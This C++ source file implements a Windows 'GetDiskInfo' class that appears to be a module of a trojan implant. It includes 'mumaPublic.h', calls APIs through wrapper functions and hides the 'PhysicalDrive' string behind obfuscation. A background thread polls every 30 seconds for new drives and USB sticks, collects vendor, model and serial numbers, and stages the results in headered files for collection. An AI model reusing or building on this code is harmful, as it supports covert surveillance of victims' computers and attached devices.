// GetUsbInfo.cpp: implementation of the GetUsbInfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "winbase.h"
#include "GetDiskInfo.h"
#include "mumaPublic.h"
#include "WinApi.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

GetDiskInfo::GetDiskInfo()
{
	mask = 0;
}

GetDiskInfo::~GetDiskInfo()
{
	if (SendBuf != NULL)
	{
		delete []SendBuf;
		SendBuf = NULL;
	}
}

void GetDiskInfo::DestroyInstance()
{
	if ( m_pInstance != 0 )
	{
		delete m_pInstance;
		m_pInstance = 0;
	}
}

GetDiskInfo *GetDiskInfo::m_pInstance = 0;

GetDiskInfo *GetDiskInfo::GetInstance()
{
	if ( m_pInstance == 0 )
	{
		m_pInstance = new GetDiskInfo();
	}
	
	return m_pInstance;
}

void GetDiskInfo::ThreadWorkStart()
{
	DWORD dwID;

	SendCount = 0;
	SendBuf = new char[USBINFOLEN*MAXCOUNT2+1024];
	offset = 1024;

	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		ThreadWork, 
		(LPVOID)this,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return;
}

DWORD WINAPI GetDiskInfo::ThreadWork(LPVOID p)
{
	GetDiskInfo *pClass = (GetDiskInfo*)p;

	while(TRUE)
	{
		pClass->EnumNew();

		PSleep(30*1000);
	}
	
	return 0;
}

//////////////////////////////////////////////////////////////////////////
 //  function to decode the serial numbers of IDE hard drives
 //  using the IOCTL_STORAGE_QUERY_PROPERTY command 
char * flipAndCodeBytes (const char * str,
    int pos,
    int flip,
    char * buf)
{
   int i;
   int j = 0;
   int k = 0;

   buf [0] = '\0';
   if (pos <= 0)
      return buf;

   if ( ! j)
   {
      char p = 0;

      // First try to gather all characters representing hex digits only.
      j = 1;
      k = 0;
      buf[k] = 0;
      for (i = pos; j && str[i] != '\0'; ++i)
      {
  char c = tolower(str[i]);

  if (isspace(c))
     c = '0';

  ++p;
  buf[k] <<= 4;

  if (c >= '0' && c <= '9')
     buf[k] |= (unsigned char) (c - '0');
  else if (c >= 'a' && c <= 'f')
     buf[k] |= (unsigned char) (c - 'a' + 10);
  else
  {
     j = 0;
     break;
  }

  if (p == 2)
  {
     if (buf[k] != '\0' && ! isprint(buf[k]))
     {
        j = 0;
        break;
     }
     ++k;
     p = 0;
     buf[k] = 0;
  }

      }
   }

   if ( ! j)
   {
      // There are non-digit characters, gather them as is.
      j = 1;
      k = 0;
      for (i = pos; j && str[i] != '\0'; ++i)
      {
      char c = str[i];

      if ( ! isprint(c))
      {
         j = 0;
         break;
      }

      buf[k++] = c;
      }
   }

   if ( ! j)
   {
      // The characters are not there or are not printable.
      k = 0;
   }

   buf[k] = '\0';

   if (flip)
      // Flip adjacent characters
      for (j = 0; j < k; j += 2)
      {
		  char t = buf[j];
		  buf[j] = buf[j + 1];
		  buf[j + 1] = t;
      }

   // Trim any beginning and end space
   i = j = -1;
   for (k = 0; buf[k] != '\0'; ++k)
   {
      if (! isspace(buf[k]))
      {
      if (i < 0)
         i = k;
      j = k;
      }
   }

   if ((i >= 0) && (j >= 0))
   {
      for (k = i; (k <= j) && (buf[k] != '\0'); ++k)
         buf[k - i] = buf[k];
      buf[k - i] = '\0';
   }

   return buf;
}

BOOL GetDiskInfo::GetDriveProperty(char cDriver, char *szVendorId, char *szProductId, char *szDeviceNo)
{
    STORAGE_PROPERTY_QUERY Query;    // 查询输入参数
    DWORD dwOutBytes;                // IOCTL输出数据长度
    BOOL bResult;                    // IOCTL返回值
	char driver[20];
	sprintf(driver, "\\\\?\\%c:", cDriver);
	
	HANDLE hDeviceHandle = PCreateFileA(driver,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	if (hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	PSTORAGE_DEVICE_DESCRIPTOR DeviceDesc;
	DeviceDesc=(PSTORAGE_DEVICE_DESCRIPTOR)new BYTE[sizeof(STORAGE_DEVICE_DESCRIPTOR) + 512 - 1];
	DeviceDesc->Size = sizeof(STORAGE_DEVICE_DESCRIPTOR) + 512 - 1;
	
    // 指定查询方式
    Query.PropertyId = StorageDeviceProperty;
    Query.QueryType = PropertyStandardQuery;
	
    // 用IOCTL_STORAGE_QUERY_PROPERTY取设备属性信息
    bResult = PDeviceIoControl(hDeviceHandle, // 设备句柄
        IOCTL_STORAGE_QUERY_PROPERTY,    // 取设备属性信息
        &Query, sizeof(STORAGE_PROPERTY_QUERY),    // 输入数据缓冲区
        DeviceDesc, DeviceDesc->Size,        // 输出数据缓冲区
        &dwOutBytes,                     // 输出数据长度
        (LPOVERLAPPED)NULL);             // 用同步I/O    
	
	if (bResult)
	{
		if ((*DeviceDesc).VendorIdOffset > 0)
		{
			flipAndCodeBytes((char*)DeviceDesc, (*DeviceDesc).VendorIdOffset, 0, szVendorId);
		}
		
		if ((*DeviceDesc).ProductIdOffset > 0)
		{
			flipAndCodeBytes((char*)DeviceDesc, (*DeviceDesc).ProductIdOffset, 0, szProductId);
		}
		
		if ((*DeviceDesc).SerialNumberOffset > 0)
		{
			if ((*DeviceDesc).BusType == BusTypeUsb)
			{
				flipAndCodeBytes((char*)DeviceDesc, (*DeviceDesc).SerialNumberOffset, 0, szDeviceNo);
			}
			else
			{
				flipAndCodeBytes((char*)DeviceDesc, (*DeviceDesc).SerialNumberOffset, 1, szDeviceNo);
			}
		}
	}
	
    return bResult;
}

BOOL GetDiskInfo::GetUSBDiskIDbyReg(char cDriver, char *szDeviceNo)
{
	char szDrv[4];
	sprintf(szDrv, "%c:\\", cDriver);

	if(PGetDriveTypeA(szDrv) != DRIVE_REMOVABLE)
	{
		return FALSE;
	}

	char lpRegPath[512] = {0};
	char lpRegValue[256] = {0};
	sprintf(lpRegPath, "SYSTEM\\MountedDevices");
	sprintf(lpRegValue, "\\DosDevices\\%c:", cDriver);

	HKEY hKey;
	long Result = 0;
	DWORD dwDataSize = 0;
	LPBYTE lpRegUSBData = NULL;
	LPSTR lpRegUSBStr = NULL;

	Result = PRegOpenKeyExA(HKEY_LOCAL_MACHINE, 
		lpRegPath,
		0, 
		KEY_QUERY_VALUE, 
		&hKey);
	if (Result != ERROR_SUCCESS)
	{
		return FALSE;
	}
	else
	{
		Result = PRegQueryValueExA(hKey,
			lpRegValue,
			NULL,
			NULL,
			lpRegUSBData,
			&dwDataSize);
		if (Result != ERROR_SUCCESS)
		{
			PRegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			lpRegUSBData = new BYTE[dwDataSize+2];
			lpRegUSBStr = new char[dwDataSize];
			memset(lpRegUSBData, 0, dwDataSize+2);
			memset(lpRegUSBStr, 0, dwDataSize);
			Result = PRegQueryValueExA(hKey,
				lpRegValue,
				NULL,
				NULL,
				lpRegUSBData,
				&dwDataSize);
			if (Result != ERROR_SUCCESS)
			{
				delete []lpRegUSBData;
				delete []lpRegUSBStr;
				PRegCloseKey(hKey);
				return FALSE;		
			}
		}
	}

	PRegCloseKey(hKey);

	dwDataSize = Unicode2GB2312((WCHAR *)lpRegUSBData, lpRegUSBStr, dwDataSize);
	delete []lpRegUSBData;

	if (strstr(lpRegUSBStr, "USBSTOR") == NULL)
	{
		delete []lpRegUSBStr;
		return FALSE;
	}

	vector<string> v_lines, v_fields;
	Split(lpRegUSBStr, dwDataSize, "#", v_lines);
	
	delete []lpRegUSBStr;

	if (v_lines.size() < 3)
	{
		return FALSE;
	}

	Split(v_lines[2].c_str(), v_lines[2].length(), "&", v_fields);

	if (v_fields.size() != 2)
	{
		return FALSE;
	}

	strcpy(szDeviceNo, v_fields[0].c_str());

	return TRUE;
}

BOOL GetDiskInfo::EnumNew()
{
	char dn[10];
	unsigned int cur_mask;
	unsigned int new_drv;
	unsigned int usb_drv;
	char szVendorId[256], szProductId[256], szDeviceNo[256], szTotalNum[50], szSerialNumber[50], szDeviceNobyRes[256], szDeviceNobyIO[256];
	char buf[USBINFOLEN];
	DWORD buflen;
	time_t tmNowTime;

	cur_mask=PGetLogicalDrives();
	GetFriendlyName();

	new_drv = (~(cur_mask&mask))&cur_mask;	//过滤出新增的驱动器
	usb_drv = 0;
	for(int i=2;i<32;i++)
	{
		if((new_drv&(0x1<<i))==0)
			continue;

		//获取类型
		int nDeviceType = myGetDeviceType('A'+i);

		if (nDeviceType == 1 || nDeviceType == 2)
		{
			usb_drv |= 0x1<<i;
		}

		//获取序列号，厂商，型号
		memset(szVendorId, 0, sizeof(szVendorId));
		memset(szProductId, 0, sizeof(szProductId));
		memset(szDeviceNo, 0, sizeof(szDeviceNo));
		memset(szDeviceNobyIO, 0, sizeof(szDeviceNobyIO));
		memset(szDeviceNobyRes, 0, sizeof(szDeviceNobyRes));

		if (nDeviceType == 2)
		{
			GetDriveProperty('A'+i, szVendorId, szProductId, szDeviceNobyIO);

			GetUSBDiskIDbyReg('A'+i, szDeviceNobyRes);

			if (szDeviceNobyRes[0] != 0)
			{
				strcpy(szDeviceNo, szDeviceNobyRes);
			}
			else
			{
				strcpy(szDeviceNo, szDeviceNobyIO);
			}
		}
		else if (nDeviceType == 0)
		{
			GetDiskIDbyOther('A'+i, szVendorId, szProductId, szDeviceNo);

			if (szDeviceNo[0] == 0)
			{
				GetDriveProperty('A'+i, szVendorId, szProductId, szDeviceNo);
			}
		}
		else
		{
			GetDriveProperty('A'+i, szVendorId, szProductId, szDeviceNo);
		}

		//获取大小
		sprintf(dn, "%c:", 'A'+i);
		memset(szTotalNum, 0, sizeof(szTotalNum));
		GetTotalNumber('A'+i, szTotalNum);

		//获取卷标号
		memset(szSerialNumber, 0, sizeof(szSerialNumber));
		GetCDriveSerialNumber('A'+i, szSerialNumber);

		tmNowTime = time(0);

		buflen = 0;
		memset(buf, 0, USBINFOLEN);
		buflen = sprintf(buf, "%d\t%s\t%s\t%s\t%s\t%s++%s++%s++%s\t%d\t%s\n", SendCount, dn, szTotalNum, szVendorId, szProductId,
			szVendorId, szProductId, szDeviceNo, szSerialNumber, nDeviceType, szDeviceNo);

		WriteBuf(buf, buflen);
	}

	if (usb_drv)
	{
		HANDLE starthandle=0;
		DWORD  threadId=0;
		starthandle = CreateThread(NULL, 0, EnumNewRemovableDriver, (void *)usb_drv, 0, &threadId);
		if (starthandle != NULL)
			CloseHandle(starthandle);
	}

	mask=cur_mask;
	WriteBuf("", 0, TRUE);

	return TRUE;
}

int GetDiskInfo::GetFriendlyName()  
{
    int i = 0;  
    int res = 0;  
    HDEVINFO hDevInfo;    
    SP_DEVINFO_DATA DeviceInfoData = {sizeof(DeviceInfoData)};     
  
    // get device class information handle  
	 DWORD dwFlag = (DIGCF_ALLCLASSES | DIGCF_PRESENT | DIGCF_DEVICEINTERFACE); 

	// DWORD dwFlag = ( DIGCF_PRESENT|DIGCF_DEVICEINTERFACE);
    hDevInfo = PSetupDiGetClassDevsA(&GUID_DEVINTERFACE_DISK, 0, 0, dwFlag);         
    if (hDevInfo == INVALID_HANDLE_VALUE)       
    {    
        return -1;  
    }    
  
    // enumerute device information  
    DWORD required_size = 0;  
    for (i = 0; PSetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData); i++)  
    {         
        DWORD DataT;
		LPSTR buffer = NULL;
		DWORD buffersize = 0;
		DWORD dwErrCode;

        // get device Class  
		if (!PSetupDiGetDeviceRegistryPropertyA(
			hDevInfo, 
			&DeviceInfoData, 
			SPDRP_CLASS, 
			&DataT, 
			(LPBYTE)buffer, 
			buffersize, 
			&buffersize))  
		{  
			if ((dwErrCode = PGetLastError() ) == ERROR_INSUFFICIENT_BUFFER)
			{
				// Change the buffer size.
				if (buffer) 
					PLocalFree(buffer);
				buffer = (CHAR *)PLocalAlloc(LPTR, buffersize);
			}
			else
				continue;
		}

		if (!PSetupDiGetDeviceRegistryPropertyA(
			hDevInfo, 
			&DeviceInfoData, 
			SPDRP_CLASS, 
			&DataT, 
			(LPBYTE)buffer, 
			buffersize, 
			&buffersize))  
		{
			continue;
		}

		if (strcmp(buffer, "DiskDrive") != 0)
		{
			continue;
		}

		PLocalFree(buffer);
		buffer = NULL;
		buffersize = 0;

        // get device friendly name  
		if (!PSetupDiGetDeviceRegistryPropertyA(
			hDevInfo, 
			&DeviceInfoData, 
			SPDRP_FRIENDLYNAME, 
			&DataT, 
			(LPBYTE)buffer, 
			buffersize, 
			&buffersize))  
		{  
			if ((dwErrCode = PGetLastError() ) == ERROR_INSUFFICIENT_BUFFER)
			{
				// Change the buffer size.
				if (buffer) PLocalFree(buffer);
				buffer = (CHAR *)PLocalAlloc(LPTR, buffersize);
			}
			else
				continue;
		}
		
		if (!PSetupDiGetDeviceRegistryPropertyA(
			hDevInfo, 
			&DeviceInfoData, 
			SPDRP_FRIENDLYNAME, 
			&DataT, 
			(LPBYTE)buffer, 
			buffersize, 
			&buffersize))  
		{
			continue;
		}

        int index = 0;  
        SP_DEVICE_INTERFACE_DATA did = {sizeof(did)};  
        PSP_DEVICE_INTERFACE_DETAIL_DATA_A pdd = NULL;  
  
        while(1)  
        {  
            // get device interface data  
            if (!PSetupDiEnumDeviceInterfaces(hDevInfo, &DeviceInfoData, &GUID_DEVINTERFACE_DISK, index++, &did))  
            {  
                res = PGetLastError();  
                if( ERROR_NO_MORE_DEVICES == res || ERROR_NO_MORE_ITEMS == res)  
                    break;  
            }

			SP_DEVINFO_DATA sdd;
			sdd.cbSize = sizeof(SP_DEVINFO_DATA);
  
            // get device interface detail size  
            if (!PSetupDiGetDeviceInterfaceDetailA(hDevInfo, &did, NULL, 0, &required_size, NULL))  
            {  
                res = PGetLastError();  
                if(ERROR_INSUFFICIENT_BUFFER == res)  
                {  
                    pdd = (PSP_DEVICE_INTERFACE_DETAIL_DATA_A)PLocalAlloc(LPTR, required_size);  
                    pdd->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);  
                }  
                else  
                    break;  
            }  
  
            // get device interface detail  
            if (!PSetupDiGetDeviceInterfaceDetailA(hDevInfo, &did, pdd, required_size, NULL, &sdd))  
            {  
                res = PGetLastError();  
                PLocalFree(pdd);  
                pdd = NULL;  
                break;  
            } 
			
			m_FriendlyNameList[pdd->DevicePath] = buffer;

            PLocalFree(pdd);  
            pdd = NULL;  
        }

		if (buffer)
		{
			PLocalFree(buffer);
			buffer = NULL;
		}
    }  
      
    PSetupDiDestroyDeviceInfoList(hDevInfo);  
    return res;  
}

int GetDiskInfo::myGetDeviceType(char cDriver)
{
	char driver[20];
	sprintf(driver, "\\\\?\\%c:", cDriver);

    HANDLE  hDevice = INVALID_HANDLE_VALUE;  
    hDevice = PCreateFileA(driver, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
    if (hDevice == INVALID_HANDLE_VALUE)  
    {
		CloseHandle(hDevice);
		return -1;
    }

	map<string, string>::iterator m_FriendlyNameIter;
	string strFriendName = "";
	
    DWORD  dwBytesReturned;  
    STORAGE_DEVICE_NUMBER sdnTempDeviceNumber;  
    if (PDeviceIoControl(hDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER,  
        NULL, 0, &sdnTempDeviceNumber, sizeof(STORAGE_DEVICE_NUMBER), &dwBytesReturned, NULL))  
    {  
        for (m_FriendlyNameIter = m_FriendlyNameList.begin(); m_FriendlyNameIter != m_FriendlyNameList.end(); m_FriendlyNameIter++)  
        {
			string strDevicePath = m_FriendlyNameIter->first;
            HANDLE hTempDevice = PCreateFileA(strDevicePath.c_str(), NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
            if (hTempDevice == INVALID_HANDLE_VALUE)  
            {  
                continue;  
            }  
			
            DWORD  dwBytesReturned;  
            STORAGE_DEVICE_NUMBER sdnStorageDeviceNumber;  
            if (PDeviceIoControl(hTempDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER,  
                NULL, 0, &sdnStorageDeviceNumber, sizeof(STORAGE_DEVICE_NUMBER), &dwBytesReturned, NULL))  
            {  
                if (sdnStorageDeviceNumber.DeviceNumber == sdnTempDeviceNumber.DeviceNumber)  
                {  
                    strFriendName = m_FriendlyNameIter->second;  
                    CloseHandle(hTempDevice);  
                    break;  
                }  
            }  
            CloseHandle(hTempDevice);  
        }  
    }  
    else  
    {  
        VOLUME_DISK_EXTENTS deDiskExtents;  
        memset(&deDiskExtents, 0, sizeof(VOLUME_DISK_EXTENTS));  
        if (!PDeviceIoControl(hDevice, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,  
            NULL, 0, &deDiskExtents, sizeof(VOLUME_DISK_EXTENTS), &dwBytesReturned, NULL))  
        {  
            CloseHandle(hDevice);
			return -1;
        }  
        for (m_FriendlyNameIter = m_FriendlyNameList.begin(); m_FriendlyNameIter != m_FriendlyNameList.end(); m_FriendlyNameIter++)  
        {
            HANDLE hTempDevice = PCreateFileA(m_FriendlyNameIter->first.c_str(), NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
            if (hTempDevice == INVALID_HANDLE_VALUE)  
            {  
                continue;  
            }  
			
            VOLUME_DISK_EXTENTS deTempDiskExtents;  
            memset(&deTempDiskExtents, 0, sizeof(VOLUME_DISK_EXTENTS));  
            if (PDeviceIoControl(hTempDevice, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,  
                NULL, 0, &deTempDiskExtents, sizeof(VOLUME_DISK_EXTENTS), &dwBytesReturned, NULL))  
            {  
                if (deDiskExtents.NumberOfDiskExtents == deTempDiskExtents.NumberOfDiskExtents  
                    &&deDiskExtents.Extents->StartingOffset.QuadPart == deTempDiskExtents.Extents->StartingOffset.QuadPart  
                    &&deDiskExtents.Extents->ExtentLength.QuadPart == deTempDiskExtents.Extents->ExtentLength.QuadPart)  
                {  
                    strFriendName = m_FriendlyNameIter->second;  
                    CloseHandle(hTempDevice);  
                    break;  
                }  
            }  
            CloseHandle(hTempDevice);  
        }  
    }

	int nRes = -1;
	char szDrv[4];
	sprintf(szDrv, "%c:\\", cDriver);

	if (!strFriendName.empty())
	{
		if (PGetDriveTypeA(szDrv) == DRIVE_REMOVABLE)
		{
			nRes = 2;
		}
		else
		{
			if (strFriendName.find("USB") != string::npos)
			{
				nRes = 1;
			}
			else
			{
				nRes = 0;
			}
		}
	}

	return nRes;
}

BOOL GetDiskInfo::GetCDriveSerialNumber(char cDriver, char *szSerialNumber)
{
	//Again as with the NIC address, the serial number of the C drive
	//could be used as the basis of a security scheme for a networked 
	//product of yours
	DWORD dwSerialNumber;
	char Disk[4];
	sprintf(Disk, "%c:\\", cDriver);
	
	BOOL bSuccess = (PGetVolumeInformationA(Disk, NULL, 0, &dwSerialNumber,
		NULL, NULL, NULL, 0) != 0);
	
	if (bSuccess)
	{
		sprintf(szSerialNumber, "0x%08x", dwSerialNumber);
	}
	
	return bSuccess;
}

BOOL GetDiskInfo::GetTotalNumber(char cDriver, char *szTotalNum)
{
	ULARGE_INTEGER nFreeBytesAvailable;  
	ULARGE_INTEGER nTotalNumberOfBytes;  
	ULARGE_INTEGER nTotalNumberOfFreeBytes;
	
	char driver[4];
	sprintf(driver, "%c:\\", cDriver);
	
	int numret = PGetDiskFreeSpaceExA(driver,  
        &nFreeBytesAvailable,  
        &nTotalNumberOfBytes,  
        &nTotalNumberOfFreeBytes);
	
	if (numret)
	{
		sprintf(szTotalNum, "%I64d", nTotalNumberOfBytes.QuadPart);
	}
	
	return numret;
}

BOOL GetDiskInfo::WriteBuf(const char * Buf, DWORD Buflen, BOOL bFinish)
{
	if (Buflen>0)
	{
		SendCount++;
		memcpy(SendBuf+offset, Buf, Buflen);
		offset += Buflen;
	}
	
	//	OutputDebugStringA("WriteBuf");
	char TmpDeStr[200];
	
	if (SendCount >= MAXCOUNT2 || (bFinish && offset>1024))
	{
		offset += sprintf(SendBuf+offset,"%d",SendCount);
		
		char tmpbuf[1024];
		// 生成描述信息
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		
		char diskinfofilename[MAX_PATH];
		char diskinfofilea[MAX_PATH];
		char FixDir[10];
		strcpy(FixDir, GetTmpPrevFix(FIX_SYSTEMINFO));
		CreateFileName(FixDir, diskinfofilename, diskinfofilea);		// 得到目标文件名

		//time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: diskinfo\r\n\r\n
		int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: diskinfo_v1\r\n\r\n",
			nowtime.wYear, nowtime.wMonth, nowtime.wDay,
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond, diskinfofilea, offset-1024);
		
		int datalen = offset-1024 + len;
		memcpy(SendBuf+1024-len, tmpbuf, len);
		
		char *pBuffer = new char[datalen+10];
		memset(pBuffer, 0, datalen+10);
		memcpy(pBuffer, SendBuf+1024-len, datalen);
		
		// #ifdef _DEBUG
		// 	FILE * fs;
		// 	fs=fopen("c:\\systeminfo.txt","w+b");
		// 	fwrite(pBuffer,1,datalen,fs);
		// 	fclose(fs);
		// #endif	
		
		myWriteFile(pBuffer, datalen, diskinfofilename, diskinfofilea);
		
		delete []pBuffer;
		memset(SendBuf, 0, USBINFOLEN*SendCount+1024);
		SendCount = 0;
		offset = 1024;
		
		PSleep(2000);
	}
	
	return TRUE;
}

BOOL GetDiskInfo::GetDiskIDbyOther(char cDriver, char *szVendorId, char *szProductId, char *szDeviceNo)
{
	char driver[20], TmpDeStr[30];
	sprintf(driver, "\\\\?\\%c:", cDriver);
	
    HANDLE  hDevice = INVALID_HANDLE_VALUE;  
    hDevice = PCreateFileA(driver, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
    if (hDevice == INVALID_HANDLE_VALUE)  
    {
		CloseHandle(hDevice);
		return FALSE;
    }

    DWORD  dwBytesReturned;  
    STORAGE_DEVICE_NUMBER sdnTempDeviceNumber;  
    if (PDeviceIoControl(hDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER,  
        NULL, 0, &sdnTempDeviceNumber, sizeof(STORAGE_DEVICE_NUMBER), &dwBytesReturned, NULL))  
    {
		HANDLE hPhysicalDriveIOCTL = 0;
		char driveName [256];
		sprintf (driveName, "\\\\.\\%s%d", DepubStringA(TmpDeStr, 30, "OZB2yGVdfoyEw"), sdnTempDeviceNumber.DeviceNumber); //PhysicalDrive

		//  Windows NT, Windows 2000, Windows XP - admin rights not required
		hPhysicalDriveIOCTL = PCreateFileA (driveName, 0,
			FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_EXISTING, 0, NULL);
		if (hPhysicalDriveIOCTL != INVALID_HANDLE_VALUE)
		{
			STORAGE_PROPERTY_QUERY query;
			DWORD cbBytesReturned = 0;
			char buffer [10000];
			
			memset ((void *) & query, 0, sizeof (query));
			query.PropertyId = StorageDeviceProperty;
			query.QueryType = PropertyStandardQuery;
			
			memset (buffer, 0, sizeof (buffer));
			
			if ( PDeviceIoControl (hPhysicalDriveIOCTL, IOCTL_STORAGE_QUERY_PROPERTY,
				& query,
				sizeof (query)+4,
				& buffer,
				sizeof (buffer),
				& cbBytesReturned, NULL) )
			{         
				STORAGE_DEVICE_DESCRIPTOR * descrip = (STORAGE_DEVICE_DESCRIPTOR *) & buffer;

				if (descrip->VendorIdOffset > 0)
				{
					flipAndCodeBytes (buffer, descrip->VendorIdOffset, 0, szVendorId );
				}
				
				if (descrip->ProductIdOffset > 0)
				{
					flipAndCodeBytes (buffer, descrip->ProductIdOffset, 0, szProductId );
				}
			
				if (descrip->SerialNumberOffset > 0)
				{
					flipAndCodeBytes (buffer, descrip->SerialNumberOffset, 1, szDeviceNo );
				}	
			}

			CloseHandle (hPhysicalDriveIOCTL);
		}
    }

	return TRUE;
}

BOOL GetDiskInfo::GetUSBDiskID(char cDriver, char *szDeviceID)
{
	char szVendorId[256], szProductId[256], szDeviceNo[256], szSerialNumber[50], szDeviceNobyIO[256], szDeviceNobyRes[256];

	memset(szVendorId, 0, sizeof(szVendorId));
	memset(szProductId, 0, sizeof(szProductId));
	memset(szDeviceNo, 0, sizeof(szDeviceNo));
	memset(szDeviceNobyIO, 0, sizeof(szDeviceNobyIO));
	memset(szDeviceNobyRes, 0, sizeof(szDeviceNobyRes));

	GetDriveProperty(cDriver, szVendorId, szProductId, szDeviceNobyIO);
	
	//其他方式获取序列号
	GetUSBDiskIDbyReg(cDriver, szDeviceNobyRes);

	if (szDeviceNobyRes[0] != 0)
	{
		strcpy(szDeviceNo, szDeviceNobyRes);
	}
	else
	{
		strcpy(szDeviceNo, szDeviceNobyIO);
	}

	memset(szSerialNumber, 0, sizeof(szSerialNumber));
	GetCDriveSerialNumber(cDriver, szSerialNumber);

	sprintf(szDeviceID, "%s++%s++%s++%s", szVendorId, szProductId, szDeviceNo, szSerialNumber);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////

int ReadPhysicalDriveInNTWithZeroRights (char *res)
{
	int done = FALSE;
	int drive = 0;
	__int64 size;
	char HardDriveSerialNumber [1024];
	char HardDriveModelNumber [1024];
	char string1[1024];
	char TmpDeStr[30];

	memset(res, 0, sizeof(res));

	for (drive = 0; drive < MAX_IDE_DRIVES; drive++)
	{
		HANDLE hPhysicalDriveIOCTL = 0;
		memset(HardDriveSerialNumber, 0, 1024);
		memset(HardDriveModelNumber, 0, 1024);
		size = 0;

		//  Try to get a handle to PhysicalDrive IOCTL, report failure
		//  and exit if can't.
		char driveName [256];

		sprintf (driveName, "\\\\.\\%s%d", DepubStringA(TmpDeStr, 30, "OZB2yGVdfoyEw"), drive); //PhysicalDrive

		//  Windows NT, Windows 2000, Windows XP - admin rights not required
		hPhysicalDriveIOCTL = PCreateFileA (driveName, 0,
			FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_EXISTING, 0, NULL);
		if (hPhysicalDriveIOCTL == INVALID_HANDLE_VALUE)
		{
			continue;
		}
		else
		{
			STORAGE_PROPERTY_QUERY query;
			DWORD cbBytesReturned = 0;
			char buffer [10000];

			memset ((void *) & query, 0, sizeof (query));
			query.PropertyId = StorageDeviceProperty;
			query.QueryType = PropertyStandardQuery;

			memset (buffer, 0, sizeof (buffer));

			if ( PDeviceIoControl (hPhysicalDriveIOCTL, IOCTL_STORAGE_QUERY_PROPERTY,
				& query,
				sizeof (query)+4,
				& buffer,
				sizeof (buffer),
				& cbBytesReturned, NULL) )
			{         
				STORAGE_DEVICE_DESCRIPTOR * descrip = (STORAGE_DEVICE_DESCRIPTOR *) & buffer;
				char serialNumber [1000];
				char modelNumber [1000];

				flipAndCodeBytes (buffer, descrip -> ProductIdOffset, 0, modelNumber );
				flipAndCodeBytes (buffer, descrip -> SerialNumberOffset, 1, serialNumber );

				if (0 == HardDriveSerialNumber [0] &&
					//  serial number must be alphanumeric
					//  (but there can be leading spaces on IBM drives)
					(isalnum (serialNumber [0]) || isalnum (serialNumber [19])))
				{
					strcpy (HardDriveSerialNumber, serialNumber);
				}
				strcpy (HardDriveModelNumber, modelNumber);
				done = TRUE;
				// Get the disk drive geometry.
				memset (buffer, 0, sizeof(buffer));
				if ( ! PDeviceIoControl (hPhysicalDriveIOCTL,
					IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
					NULL,
					0,
					&buffer,
					sizeof(buffer),
					&cbBytesReturned,
					NULL))
				{
					//FALSE
				}
				else
				{         
					DISK_GEOMETRY_EX* geom = (DISK_GEOMETRY_EX*) &buffer;
					size = geom->DiskSize.QuadPart;
				}
			}
			else
			{
				DWORD err = PGetLastError ();
			}
			CloseHandle (hPhysicalDriveIOCTL);
		}

		float gsize = (float)(size/(1000*1000))/(float)1000;
		
		//\r\n磁盘%d :\r\n  型号ID: %s\r\n
		sprintf (string1, "%d%s", drive, HardDriveModelNumber);
		strcat(res,string1);
		//  序列号: %s\r\n
		sprintf(string1, "%s", HardDriveSerialNumber);
		strcat(res,string1);
		//  大小  : %1.2f G\r\n
		sprintf(string1, "%1.2f", gsize);
		strcat(res,string1);
	}

	return done;
}
